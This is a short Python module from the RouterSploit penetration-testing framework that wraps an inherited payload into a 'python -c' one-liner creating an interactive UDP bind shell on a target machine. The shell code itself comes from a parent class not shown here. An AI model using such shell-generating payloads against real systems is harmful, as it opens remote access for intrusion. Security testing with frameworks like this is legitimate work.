from routersploit.core.exploit import *
from routersploit.modules.payloads.python.bind_udp import Exploit as PythonBindUDP


class Exploit(PythonBindUDP):
    __info__ = {
        "name": "Python Bind UDP One-Liner",
        "description": "Creates interactive udp bind shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        )
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = '{} -c "{}"'.format(self.cmd, payload)
        return cmd
